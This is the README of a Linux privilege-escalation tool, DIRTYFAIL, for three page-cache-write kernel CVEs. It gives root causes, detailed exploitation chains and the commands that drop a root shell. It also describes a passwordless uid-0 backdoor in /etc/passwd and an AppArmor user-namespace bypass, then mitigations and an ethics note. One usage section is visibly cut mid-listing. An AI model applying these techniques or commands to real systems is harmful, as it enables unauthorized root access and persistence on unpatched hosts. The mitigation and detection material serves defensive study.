DIRTYFAIL is a small, well-documented C tool for security researchers.
It detects whether a Linux host is vulnerable to the three CVEs in this
family, and — with explicit, typed confirmation — runs a real
proof-of-concept that drops the caller into a root shell on a
vulnerable system.

| CVE / variant | Name | DIRTYFAIL coverage |
|---|---|---|
| **CVE-2026-31431** | Copy Fail (algif_aead `authencesn` page-cache write) | Detect + full PoC |
| **CVE-2026-43284 v4** | Dirty Frag — IPv4 xfrm-ESP page-cache write          | Detect + full PoC |
| **CVE-2026-43284 v6** | Dirty Frag — IPv6 xfrm-ESP page-cache write (`esp6`) | Detect + full PoC |
| **CVE-2026-43500**    | Dirty Frag — RxRPC page-cache write                  | Detect + full PoC |
| Copy Fail GCM variant | xfrm-ESP `rfc4106(gcm(aes))` page-cache write        | Detect + full PoC |

**Bonus modes:**

- **`--exploit-backdoor`** — persistent uid-0 backdoor: length-matched
  overwrite of a `nologin`/`false`/`sync` line in `/etc/passwd` with
  `dirtyfail::0:0:<pad>:/:/bin/bash`. Survives shell exit until page
  is evicted. State stashed at `/var/tmp/.dirtyfail.state` for
  `--cleanup-backdoor`. The `dirtyfail` username is deliberately
  matched to this project so it's instantly identifiable in any
  audit — change `NEW_USER` in `src/backdoor.c` if you need a
  different identifier for an authorized red-team engagement.
- **AppArmor bypass** — defeats Ubuntu's
  `apparmor_restrict_unprivileged_userns=1` policy via a single-hop
  `change_onexec("crun")` re-exec into an unconfined profile that
  retains userns capabilities. Each exploit mode handles this
  internally via a fork: parent stays in init namespace, child does
  the bypass dance, parent reads global page cache and runs `su` for
  REAL init-ns root. The legacy `--aa-bypass` flag still exists for
  debugging the bypass mechanics in isolation. See [§8.5 Architecture](#85-architecture-outerinner-fork-based-bypass).

## Verified working on

DIRTYFAIL has been **empirically validated end-to-end** on real
hardware for the following kernels:

| Distro | Kernel | xfrm-ESP v4 | xfrm-ESP v6 | RxRPC | GCM | Backdoor |
|---|---|:-:|:-:|:-:|:-:|:-:|
| Ubuntu 24.04 LTS | `6.8.0-111-generic` | ✅ | ✅ | ✅ | ✅¹ | ✅¹ |

¹ GCM and Backdoor require `algif_aead` to be loadable. Ubuntu 24.04
ships `/etc/modprobe.d/disable-algif_aead.conf` blacklisting it as a
Copy Fail mitigation. With the blacklist removed (e.g. on a kernel
predating the mitigation), both modes work end-to-end.

For the RxRPC variant, we proved real init-namespace root by reading
`/etc/shadow` (`root:*:19962:0:99999:7:::`) after `echo "" | su -`
returned `uid=0(root)`. For the backdoor mode, `echo "" | su - dirtyfail`
likewise dropped a real root shell. These are not userns-uid-0 ghosts —
they are real init-ns root.

> **Authorized testing only.** Use DIRTYFAIL only on systems you own or
> are explicitly engaged to assess. The exploit modes corrupt
> `/etc/passwd` *in the kernel page cache* (the on-disk file is never
> touched). Cleanup is `dirtyfail --cleanup` or
> `echo 3 > /proc/sys/vm/drop_caches`.

## 1. The bug class

**Page-cache write** vulnerabilities let an unprivileged user modify
the kernel's in-memory copy of a file they only have read access to.
The on-disk file is never written; the modification persists in RAM
until the page is evicted (`drop_caches`, memory pressure, or reboot).

This class started with **Dirty Pipe** (CVE-2022-0847), which abused
`pipe_buffer` flags. Copy Fail and Dirty Frag are descendants that
target the `frag` member of `struct sk_buff` instead. The mechanism is
always the same:

1. Userspace `splice()`s a page-cache page from a readable file (e.g.
   `/etc/passwd`, `/usr/bin/su`) into the frag of a kernel buffer.
2. A receive path runs **in-place** crypto on that buffer — the same
   pages are both source and destination of the operation.
3. The crypto routine performs a "scratch" STORE outside the data
   region (a sequence-number rearrangement, a single-block decrypt,
   etc.) that lands inside the user-pinned page.
4. The page-cache copy of the file is now permanently modified for
   every reader on the host, until the page is evicted.

Because the bug is a **deterministic logic flaw**, not a race, success
rates are essentially 100% and the kernel does not panic on failure.

## 2. CVE-2026-31431 — Copy Fail

* Disclosure: **2026-04-29**
* Site: <https://copy.fail/>
* Original PoC (C):     [Smarttfoxx/copyfail](https://github.com/Smarttfoxx/copyfail)
* Original PoC (Python): [rootsecdev/cve_2026_31431](https://github.com/rootsecdev/cve_2026_31431)
* Introduced by commit:  `72548b093ee3` (2017)
* Fixed by commit:       `a664bf3d` (mainline 6.12 / 6.17 / 6.18 stables)
* Confirmed affected:    Ubuntu 24.04 LTS, Amazon Linux 2023, RHEL 14.3, SUSE 16

### Root cause

The kernel's `algif_aead` module exposes the AEAD crypto API to
userspace via `AF_ALG`. The `authencesn(hmac(sha256), cbc(aes))`
template implements RFC-4303 ESN (Extended Sequence Numbers); part of
its decryption path performs a **4-byte scratch write** to rearrange
the sequence number:

```c
static int crypto_authenc_esn_decrypt(struct aead_request *req)
{
    /* Move high-order bits of sequence number to the end. */
    scatterwalk_map_and_copy(tmp, src, 0, 8, 0);
    if (src == dst) {
        scatterwalk_map_and_copy(tmp,     dst, 4,                  4, 1);
        scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);  // ★
        ...
```

The STORE at ★ is harmless on a normal IPsec packet — it lands inside
the skb's tag area, which is kernel-owned. The crypto template
**assumes** `src` and `dst` point into kernel memory.

`algif_aead` violates that assumption. It accepts `splice()` from
userspace, which plants page-cache pages into the request's
scatterlist. Because the AEAD runs in-place (`req->dst = req->src`),
the page-cache page now sits at the destination scatterlist offset
that the scratch write targets.

The 4 bytes that get written are bytes 4..7 of the AAD that userspace
sent — the "seqno_lo" field of an ESP header, which the attacker fills
with whatever they want.

**Net primitive**: 4-byte arbitrary-offset write into the page cache
of any file the attacker can `open(O_RDONLY)`.

### Exploitation

The simplest weaponization is in `/etc/passwd`. A normal user line
looks like:

```
kara:x:1000:1000:Kara,,,:/home/kara:/bin/bash
```

Flipping `1000` (the UID field, exactly 4 ASCII bytes for any UID
1000–9999) to `0000` makes glibc's `getpwnam()` report uid=0 for
that user. PAM, however, still authenticates against the on-disk
`/etc/shadow` (which is untouched), so `su <user>` prompts for the
real password, validates it, then `setuid(0)` — and lands at root
because the page-cache copy of `/etc/passwd` says we are root.

`/etc/shadow` integrity is preserved. On-disk `/etc/passwd` is
preserved. Only the kernel's RAM copy of `/etc/passwd` is corrupted,
and only until `drop_caches` or reboot.

## 3. CVE-2026-43284 — Dirty Frag (xfrm-ESP)

* Disclosure: **2026-04-30 → 2026-05-08**
* Original PoC (C): [V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag)
* Researcher: Hyunwoo Kim ([@v4bel](https://x.com/v4bel))
* Introduced by commit: `cac2661c53f3` (2017-01-17)
* Fixed by commit:      `f4c50a4034e6` (mainline net.git, merged 2026-05-07)
* Confirmed affected:   Ubuntu 24.04, RHEL 10.1, openSUSE Tumbleweed,
                        CentOS Stream 10, AlmaLinux 10, Fedora 44

### Root cause

`esp_input()` is supposed to call `skb_cow_data()` before in-place AEAD
decryption when an skb is non-linear (i.e. has frags). The code path
has a short-circuit:

```c
if (!skb_cloned(skb)) {
    if (!skb_is_nonlinear(skb)) {
        nfrags = 1;
        goto skip_cow;
    } else if (!skb_has_frag_list(skb)) {        // ★ bug
        nfrags = skb_shinfo(skb)->nr_frags;
        nfrags++;
        goto skip_cow;
    }
}
```

If the skb has frags but no `frag_list`, esp_input bypasses
`skb_cow_data` and hands the user-supplied frag straight to the AEAD
template. The same `authencesn(...)` scratch write that powers Copy
Fail then lands at file offset `(assoclen + cryptlen)` of the spliced
page.

The 4 STOREd bytes are `seq_hi` from the SA's `replay_esn` state —
attacker-controlled at SA registration time via the
`XFRMA_REPLAY_ESN_VAL` netlink attribute.

**Cost**: registering an XFRM SA needs `CAP_NET_ADMIN`, so the
attacker enters a fresh user namespace via `unshare(CLONE_NEWUSER)`
first. This is allowed by default on most distros (Ubuntu's hardened
profile is the notable exception).

**Crucially, this primitive works even when the algif_aead Copy Fail
mitigation is in place** — the xfrm path doesn't go through algif_aead.
A defender who only blacklisted `algif_aead` is still vulnerable to
Dirty Frag.

### Exploitation

V4bel's published PoC writes a 192-byte static "root-shell" ELF over
the first 192 bytes of `/usr/bin/su`'s page cache, using 48 sequential
4-byte STOREs. After modification, `execve("/usr/bin/su")` runs the
new ELF entry point with the setuid-root bit intact, drops PAM
entirely, and `execve("/bin/sh")` from inside the shellcode.

DIRTYFAIL takes the simpler `/etc/passwd` UID-flip approach (one
4-byte STORE — the same target as Copy Fail) for two reasons:

1. It is a single-write primitive demonstration, easier to study.
2. It is fully reversible with `POSIX_FADV_DONTNEED` and does not
   leave `/usr/bin/su` in a corrupt state for other users on the
   system.

## 4. CVE-2026-43500 — Dirty Frag (RxRPC)

* Disclosure: **2026-04-29 → 2026-05-08**
* Patch:        not in any tree as of 2026-05-08; researcher's patch
                pending: `lore.kernel.org/all/afKV2zGR6rrelPC7@v4bel/`
* Researcher:   Hyunwoo Kim ([@v4bel](https://x.com/v4bel))
* Introduced by commit: `2dc334f1a63a` (2023-06)

### Root cause

`rxkad_verify_packet_1()` performs an **in-place** `pcbc(fcrypt)`
single-block decryption on the first 8 bytes of an RxRPC data packet:

```c
sg_init_table(sg, ARRAY_SIZE(sg));
ret = skb_to_sgvec(skb, sg, sp->offset, 8);
memset(&iv, 0, sizeof(iv));
skcipher_request_set_crypt(req, sg, sg, 8, iv.x);   // ★ src == dst
ret = crypto_skcipher_decrypt(req);                 // ★ 8-byte STORE
```

If a page-cache page has been spliced into the skb's frag, the 8-byte
decrypt is performed on top of it.

**Difference from xfrm-ESP**: the 8 bytes that get STOREd are
`fcrypt_decrypt(C, K)`, where `C` is the existing ciphertext at that
file offset and `K` is the session key from an RxRPC v1 token the
attacker registered via `add_key("rxrpc", ...)`. The attacker doesn't
control the STORE value directly — they have to brute-force `K` until
`fcrypt_decrypt(C, K)` produces the desired plaintext.

`fcrypt` is an Andrew File System cipher with a **56-bit key** and
8-byte block. It is deterministic; it ports cleanly to user space; and
its key space is small enough that a constrained 8-byte target can be
brute-forced in milliseconds to seconds depending on the constraint
budget.

**Crucially, this path does NOT need namespace privileges** —
`add_key`, `socket(AF_RXRPC)`, `socket(AF_ALG)`, `splice` are all
available to any unprivileged user. RxRPC fills the gap on Ubuntu's
hardened-userns profile (where xfrm-ESP is blocked) because
`rxrpc.ko` ships in the default Ubuntu build.

### Exploitation

The full exploit:

1. Brute-force `K_A`, `K_B`, `K_C` in user-space such that the three
   STOREs at `/etc/passwd` offsets 4, 6, 8 produce
   `"::"`, `"0:"`, `"0:GGGGGG:"` respectively (last-write-wins).
2. For each `K_i`, register an RxRPC v1 token with `add_key`, perform
   a forged AF_RXRPC handshake against a fake UDP server in the same
   process, and trigger `rxkad_verify_packet_1` via splice.
3. The page-cache copy of `/etc/passwd` line 1 is now
   `root::0:0:GGGGGG:/root:/bin/bash` — an empty password field.
4. PAM with `pam_unix.so nullok` accepts the empty password; `su -`
   drops a root shell.

### DIRTYFAIL coverage

DIRTYFAIL ships **both** detection and a full PoC for this CVE.

The DIRTYFAIL implementation lives in `src/dirtyfrag_rxrpc.c` and
`src/fcrypt.c`:

- **fcrypt cipher** (`fcrypt.c`): 56-bit key, 8-byte block, 16-round
  Feistel; standard rxkad protocol S-boxes. Includes a single-core
  brute-force harness (~18 Mops/s) that searches the key space until
  a candidate plaintext satisfies a caller-supplied predicate.
- **rxkad checksum** (`compute_csum_iv`, `compute_cksum`): kernel
  formula reproduced via AF_ALG `pcbc(fcrypt)` so that the wire cksum
  in our forged DATA packet passes `rxkad_verify_packet`'s gate.
- **RxRPC v1 token build** (`build_rxrpc_v1_token`): XDR-encoded
  rxkad token registered via `add_key("rxrpc", ...)` with our
  brute-forced session key.
- **AF_RXRPC client + UDP fake-server**: the client initiates a call,
  the fake-server extracts (epoch, cid, callNumber) from the first
  packet and emits a forged CHALLENGE so the client primes
  `conn->rxkad.cipher` with our key.
- **Splice trigger** (`do_one_trigger`): vmsplice forged DATA wire
  header → splice 8 bytes from `/etc/passwd` → splice pipe → udp_srv
  → recvmsg drives kernel through `rxkad_verify_packet_1` → 8-byte
  STORE.
- **3-splice chain with chained-ciphertext correction**: brute force
  K_A / K_B / K_C, applying the chained ciphertext shift between
  passes (after splice A overwrites bytes 4..11, splice B's
  ciphertext at 6..13 starts with `P_A[2..7]`; same for C against B).

The final PoC reshapes `/etc/passwd` line 1 to:

```
root::0:0:GGGGG:/root:/bin/bash
```

— empty password field — and `execlp("su", "-")` then drops a root
shell because `pam_unix.so nullok` accepts an empty password.

                         instead revert the page-cache patch and exit
  --no-color             disable ANSI color in output
```

### Detection (safe; no system modification)

```sh
./dirtyfail --scan
```

Sample output on a vulnerable Ubuntu 24.04:

```
[*] Copy Fail (CVE-2026-31431) — detection
[i] kernel 6.17.x (affected lines: 6.12, 6.17, 6.18)
[+] AF_ALG + authencesn(hmac(sha256),cbc(aes)) loadable
[*] triggering primitive against /tmp/copyfail-sentinel.XXXX with marker 'PWND'
[!] VULNERABLE — marker 'PWND' landed at sentinel offset 24

[*] Dirty Frag — xfrm-ESP variant (CVE-2026-43284) — detection
[i] kernel 6.17.x
[i] esp4 currently loaded: yes
[i] esp6 currently loaded: yes
[i] unprivileged user namespace: allowed
[!] VULNERABLE (preconditions met) — userns + xfrm SA registration available

[*] Dirty Frag — RxRPC variant (CVE-2026-43500) — detection
[i] rxrpc currently loaded: yes
[i] AF_RXRPC socket: openable
[!] VULNERABLE — RxRPC variant of Dirty Frag is reachable
```

### Exploit (requires typed confirmation)

```sh
./dirtyfail --exploit-copyfail
```

You will be prompted to type `DIRTYFAIL` and press enter before any
page-cache modification happens. After a successful flip, DIRTYFAIL
invokes `su <yourname>`; type your **own** password — PAM still
checks against the untouched `/etc/shadow`, then `setuid(0)` lands
at root because the page cache says you are uid 0.

To run the exploit without spawning a shell (useful for CI / repeated
testing):

```sh
./dirtyfail --exploit-copyfail --no-shell
```

This applies the patch, verifies it landed, then evicts
`/etc/passwd` from the page cache via `POSIX_FADV_DONTNEED` so the
system returns to a clean state.

### Cleanup

After any exploit run:

```sh
./dirtyfail --cleanup           # evict /etc/passwd from page cache
sudo ./dirtyfail --cleanup      # also drop_caches (requires root)
```

Or directly:

```sh
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

---

## 7. How DIRTYFAIL detects each CVE

### Copy Fail (active sentinel probe)

Detection actually triggers the primitive against a sentinel file in
`/tmp`:

1. Probe `socket(AF_ALG, SOCK_SEQPACKET, 0)` and `bind` to
   `authencesn(hmac(sha256), cbc(aes))`.
2. Create a 4 KiB sentinel file in `/tmp` and fault its first page
   into the cache.
3. Run the full exploit primitive against it: `sendmsg` AAD with
   `seqno_lo = "PWND"`, splice 32 bytes of the sentinel into the AF_ALG
   op socket, drive `recv` to fire the scratch write.
4. Re-read the sentinel and look for `PWND` anywhere in the first
   page.

Marker found ⇒ vulnerable. Marker absent but page contents differ ⇒
the primitive partially fired (still vulnerable). Page identical ⇒
not vulnerable on this kernel.

### Dirty Frag xfrm-ESP (precondition-based)

Detection is precondition-only — we don't enter a user namespace in
detect mode (it would side-effect networking inside that namespace).
We check:

* kernel version within affected window
* `esp4` / `esp6` currently loaded or autoloadable
* unprivileged user namespace creation succeeds (probed via fork →
  child `unshare(CLONE_NEWUSER)`)

All three present ⇒ VULNERABLE.

### Dirty Frag RxRPC (precondition-based)

* `rxrpc` in `/proc/modules` or autoloadable
* `socket(AF_RXRPC, SOCK_DGRAM, 0)` succeeds

Either ⇒ VULNERABLE.

---

## 8. How DIRTYFAIL exploits each CVE

### Copy Fail exploit (`copyfail.c`)

Single 4-byte STORE through `algif_aead`:

```
                                          [/etc/passwd page cache]
 user  ──sendmsg(AAD = SPI||"0000")──▶ AF_ALG op
       ──splice(passwd_fd, 32B)──────▶ AF_ALG op (in-place dst SGL)
       ──recv()─────────────────────▶ kernel runs authencesn_decrypt
                                        scratch write: "0000" → uid_off
                                        EBADMSG returned to user (we ignore)

 user  ──execlp("su", "kara")──────▶ PAM ✓ on /etc/shadow → setuid(0)
                                       ─────► root shell
```

### Dirty Frag xfrm-ESP exploit (`dirtyfrag_esp.c`)

Same end-state as Copy Fail, reached through `xfrm_input` instead of
`algif_aead`:

```
                                          [/etc/passwd page cache]
 unshare(USER|NET); setup uid_map; ifup lo
 NETLINK_XFRM ─NEWSA(seq_hi="0000", encap=ESPINUDP/4500)─▶ kernel
 udp_recv  bind 127.0.0.1:4500, UDP_ENCAP_ESPINUDP
 udp_send  connect 127.0.0.1:4500
 vmsplice  ESP wire header (24B) ─▶ pipe
 splice    /etc/passwd@uid_off (16B) ─▶ pipe
 splice    pipe (40B) ─▶ udp_send
 udp loopback ─▶ udp_recv (UDP_ENCAP) ─▶ xfrm_input ─▶ esp_input
   skb has frags, no frag_list ─▶ goto skip_cow      (THE BUG)
   crypto_authenc_esn_decrypt:
     scratch_write(seq_hi="0000" → page_addr+uid_off)  ◄─ 4-byte STORE
   AEAD auth fails (EBADMSG) — but the STORE is permanent
 page-cache copy of /etc/passwd now reports uid 0 for the user
```

Then exit the namespace, `execlp("su", user)` from the parent — same
final step as Copy Fail.

### Dirty Frag RxRPC exploit (`dirtyfrag_rxrpc.c` + `fcrypt.c`)

```
                                          [/etc/passwd page cache]
 user-space brute force of K_A, K_B, K_C such that fcrypt_decrypt(C, K)
   produces predicate-satisfying plaintexts for offsets 4, 6, 8
   (chained-ciphertext correction across passes)

 fork → child enters new userns:
   unshare(USER|NET); setup uid_map; ifup lo
   socket(AF_RXRPC) — autoload rxrpc.ko
   for each (off, K) in [(4,K_A), (6,K_B), (8,K_C)]:
     add_key("rxrpc", "df-evil<n>", v1_token{session_key=K})
     udp_srv = bind 127.0.0.1:port_S
     rxsk    = AF_RXRPC + SECURITY_KEY=df-evil<n> + bind :port_C
     rxsk → sendmsg(PINGPING)              triggers handshake init
     udp_srv ← receives kernel's first DATA-0
       extract (epoch, cid, callNumber)
     udp_srv → forged CHALLENGE             → rxsk auto-RESPONSE
                                               primes conn->rxkad.cipher with K
     csum_iv = AF_ALG pcbc(fcrypt)(epoch||cid||0||sec_ix, IV=K)
     cksum_h = AF_ALG pcbc(fcrypt)(call_id||x, IV=csum_iv)[1] >> 16
     vmsplice DATA hdr (28B) → pipe
     splice  /etc/passwd@off (8B) → pipe
     splice  pipe (36B) → udp_srv
     udp loopback → rxsk
       recvmsg → rxrpc_input → rxkad_verify_packet
         skb has frags, no frag_list → goto skip_unshare    (THE BUG)
         skcipher_request_set_crypt(req, sg=page+off, sg=page+off, 8, iv=0)
         crypto_skcipher_decrypt: pcbc(fcrypt)
           page[off..off+8] = fcrypt_decrypt(C_actual, K)    ◄─ 8-byte STORE

 child exits, parent verifies /etc/passwd[4..5] == "::"
 parent: execlp("su", "-")
   PAM common-auth: pam_unix.so nullok    → root has empty password
   su  → setresuid(0,0,0) → exec /bin/bash
                                       ─────► root shell
```

## 8.5 Architecture: outer/inner fork-based bypass

All five exploit modes share a common architecture for handling
Ubuntu's `apparmor_restrict_unprivileged_userns=1` policy without
trapping the post-exploit `su` inside a userns where it can't reach
real init-ns root.

### The problem

A naive bypass puts the *whole* `dirtyfail` process inside a fresh
user namespace via `unshare(CLONE_NEWUSER)`. That's enough to register
XFRM SAs and fire splice triggers — but it also means the eventual
`execlp("su", user)` runs inside the userns, where uid 0 is mapped via
`uid_map "0 1000 1"` to the operator's outer uid (1000). PAM's
`setresuid(0)` then lands at userns-uid-0-mapped-to-1000, which is
**not** real init-ns root — `cat /etc/shadow` returns EACCES, the
shell can't actually do privileged operations.

### The fix: outer/inner split

```
parent (dirtyfail, init ns)                 child (bypass userns)

                                                                          unshare(USER|NET)
                                                                          uid_map / capset
                                                                          ifup lo

                                                                          dispatch <mode>_inner()
                                                                          register XFRM SA
                                                                          splice trigger → page cache STORE
                                                                          _exit(DF_EXPLOIT_OK)
waitpid ◄───────────────────────────────── (child reaped)
read /etc/passwd (page cache is global)
verify modification visible
if do_shell:
  execlp("su", user) ← runs IN INIT NS
                       PAM auth → setresuid(0)
                       → REAL init-ns root shell
else:
  try_revert_passwd_page_cache
```

The parent **never enters a user namespace**. The child does the
bypass + kernel work, modifies the global page cache (which is shared
across namespaces — the only "bridge" we need), and exits. The
parent's `su` is then a normal init-namespace setresuid call.

### Parent → child handoff via env vars

`execv` preserves the environment, so the parent stashes the
operation parameters in env vars before forking. Each mode defines
its own:

| Mode | Env vars |
|---|---|
| `esp` / `esp6` / `gcm` | `DIRTYFAIL_INNER_MODE`, `DIRTYFAIL_TARGET_USER` |
| `rxrpc` | `DIRTYFAIL_INNER_MODE=rxrpc`, `DIRTYFAIL_K_{A,B,C}` (hex) — fcrypt brute force happens in the parent (no caps needed); the keys are passed to the child for the actual triggers |
| `backdoor-install` / `backdoor-cleanup` | `DIRTYFAIL_INNER_MODE`, `DIRTYFAIL_LINE_OFF`, `VICTIM_LINE`, `TARGET_LINE` |

After stage 2 of the bypass completes, `main()` checks
`DIRTYFAIL_INNER_MODE` and dispatches to `<mode>_exploit_inner()`. The
inner does *only* the kernel work (no prompts, no fork, no `su`) and
exits with the result code. The parent reaps it via `waitpid` and
proceeds with verification.

### Why the single-hop bypass

The earlier two-hop dance (`change_onexec("crun")` → `change_onexec("chrome")`)
caused intermittent `ENOSPC` failures on Ubuntu 24.04 in our exec
chain (likely a per-profile userns-accounting wrinkle). The single
hop into `crun` is sufficient — `crun`'s AppArmor profile has
`flags=(unconfined)` and explicit `userns,` permission, so unshare
succeeds and stays succeeded.

### Why no infinite re-exec loop

After stage 2 completes successfully, a process-local
`g_bypass_done` flag is set. If `apparmor_bypass_needed()` is called
again in the same process, it short-circuits to `false`, preventing
the post-exploit code from re-arming and nesting another userns
layer (which previously hit the per-userns nesting cap as `ENOSPC`).

### `--aa-bypass` is now a debug-only flag

In the old architecture, `--aa-bypass` armed a whole-process bypass
before the exploit dispatch. In the new architecture, exploit modes
do their *own* fork-based bypass internally; the flag is no longer
needed for normal use. It's retained for debugging the bypass
mechanics in isolation (e.g. running `--scan` inside a bypass
userns), with a warning that it may break post-exploit `su`.

## 9. Mitigations

### Copy Fail (CVE-2026-31431)

1. **Apply the patch.** Mainline `a664bf3d`; backports landed on the
   6.12 / 6.17 / 6.18 stable lines.
2. **Interim**: blacklist `algif_aead`:
   ```sh
   echo 'install algif_aead /bin/false' | sudo tee /etc/modprobe.d/copyfail.conf
   sudo rmmod algif_aead 2>/dev/null
   ```
   ⚠ Note: this **does not** mitigate Dirty Frag. The xfrm-ESP path
   reaches the same authencesn primitive without going through
   algif_aead.

### Dirty Frag xfrm-ESP (CVE-2026-43284)

1. **Apply the patch.** Mainline `f4c50a4034e6` (merged 2026-05-07).
   Distro backports rolling out as of 2026-05-08.
2. **Interim**: blacklist `esp4` and `esp6`:
   ```sh
   sudo tee /etc/modprobe.d/dirtyfrag-esp.conf <<'EOF'
   install esp4 /bin/false
   install esp6 /bin/false
   EOF
   sudo rmmod esp4 esp6 2>/dev/null
   sudo sysctl vm.drop_caches=3
   ```
   ⚠ This breaks IPsec / strongSwan / libreswan VPNs.
3. **Defense in depth**: disallow unprivileged user namespaces.
   Ubuntu does this by default via AppArmor; on other distros:
   ```sh
   sudo sysctl -w kernel.unprivileged_userns_clone=0
   ```

### Dirty Frag RxRPC (CVE-2026-43500)

1. **No upstream patch yet.** Researcher patch on lkml; not merged at
   time of writing (2026-05-08).
2. **Interim**: blacklist `rxrpc`:
   ```sh
   sudo tee /etc/modprobe.d/dirtyfrag-rxrpc.conf <<'EOF'
   install rxrpc /bin/false
   EOF
   sudo rmmod rxrpc 2>/dev/null
   sudo sysctl vm.drop_caches=3
   ```
   ⚠ This breaks AFS distributed file system clients. Most servers
   don't need rxrpc.

### Combined one-liner (all three)

```sh
sudo sh -c '
cat > /etc/modprobe.d/dirtyfail.conf <<EOF
install algif_aead /bin/false
install esp4 /bin/false
install esp6 /bin/false
install rxrpc /bin/false
EOF
rmmod algif_aead esp4 esp6 rxrpc 2>/dev/null
sysctl vm.drop_caches=3
'
```

## 10. Ethics & disclosure

DIRTYFAIL is a research tool. The vulnerabilities it covers are
**already publicly disclosed** with weaponized PoCs in the wild
(see [Credits](#11-credits)) — DIRTYFAIL adds detection coverage,
unified documentation, and a gentler PoC variant (UID-flip vs ELF
overwrite of `/usr/bin/su`).

* **Do not run `--exploit-*` modes on systems you do not own or are
  not explicitly authorized to test.** Page-cache modifications are
  reversible with `drop_caches`, but they are still privilege
  escalation while they persist.
* **Do not deploy DIRTYFAIL as a "scanner" against third-party
  infrastructure** without written authorization. The detection mode
  is non-modifying for system files but does open a sentinel file in
  `/tmp` and exercise the kernel crypto API.
* If you find a vulnerable system in the wild, follow responsible
  disclosure to the operator, not the public.

## Bonus: notes on the GCM variant + backdoor + AppArmor bypass

These three features extend DIRTYFAIL with techniques first published
by **0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo**. Reimplemented
in DIRTYFAIL style; original credit lives in `NOTICE.md`.

### Copy Fail GCM variant

Same xfrm-ESP no-COW path as CVE-2026-43284, but using
`rfc4106(gcm(aes))` instead of `authencesn(...)`. Two reasons it's
worth shipping alongside the authencesn variant:

1. **Coverage.** A defender who blacklisted `algif_aead` to mitigate
   Copy Fail (CVE-2026-31431) is still vulnerable here — the GCM
   path doesn't go through algif_aead.
2. **Granularity.** AES-GCM in counter mode XORs keystream onto the
   spliced byte. By brute-forcing the IV (~256 trials per byte) we
   land an arbitrary single byte at any file offset — no 4-byte
   alignment, no 4-byte side-effects.

The 1-byte primitive (`cfg_1byte_write`) is what makes the persistent
backdoor mode feasible.

### Persistent backdoor

`--exploit-backdoor` picks the longest `/etc/passwd` line whose shell
is in `{nologin, false, sync}` and overwrites it byte-by-byte with
`dirtyfail::0:0:<pad>:/:/bin/bash` (length-matched). After installation,
`su - dirtyfail` from any user drops a root shell — no password prompt —
because `pam_unix.so nullok` accepts the empty password field.

The username `dirtyfail` is intentionally branded to this project so
it's *easy to detect* in any subsequent audit — defenders running
`grep dirtyfail /etc/passwd` (or any HIDS doing the same) will spot
the line immediately. If you need a different identifier for a
specific red-team engagement, change `NEW_USER` and `DF_PREFIX` in
`src/backdoor.c`.

The on-disk file is unchanged; the substitution lives in the page
cache only. `--cleanup-backdoor` restores the original line via the
same primitive.

### AppArmor bypass

Ubuntu 24.04+ ships `apparmor_restrict_unprivileged_userns=1`. The
default profile applied to unprivileged binaries lets `unshare(USER)`
succeed but **strips CAP_NET_ADMIN** in the new namespace. XFRM SA
registration then fails silently.

The bypass: write `"exec crun"` to `/proc/self/attr/exec` and
`execv` to switch into AppArmor's `crun` profile, which has
`flags=(unconfined)` and explicit `userns,` permission. After the
exec, `unshare(CLONE_NEWUSER | CLONE_NEWNET)` succeeds with full
caps inside the new namespace.

DIRTYFAIL handles this *per-exploit-mode* via a fork: parent stays
in init namespace, child does the bypass + kernel work, parent
reads global page cache and runs `su` for real init-ns root. See
[§8.5 Architecture](#85-architecture-outerinner-fork-based-bypass)
for the full chain. The legacy `--aa-bypass` flag (which armed the
bypass for the whole process) is retained for debugging only.

The original technique is from `aa-rootns.c` by 0xdeadbeefnetwork
(credited there to Brad Spengler / grsecurity). DIRTYFAIL's
implementation:

- Detects the restriction via the
  `kernel.apparmor_restrict_unprivileged_userns` sysctl rather than
  by reading `/proc/self/attr/current` (which still shows
  "unconfined" on Ubuntu 24.04 even when the policy is restricting).
- Uses a single hop into `crun` rather than the two-hop
  `crun → chrome` dance — the second hop caused intermittent
  `ENOSPC` on Ubuntu 24.04.
- Sets a process-local `g_bypass_done` flag after stage 2 so re-checks
  short-circuit (preventing infinite re-exec loops that previously
  exhausted the per-userns nesting cap).
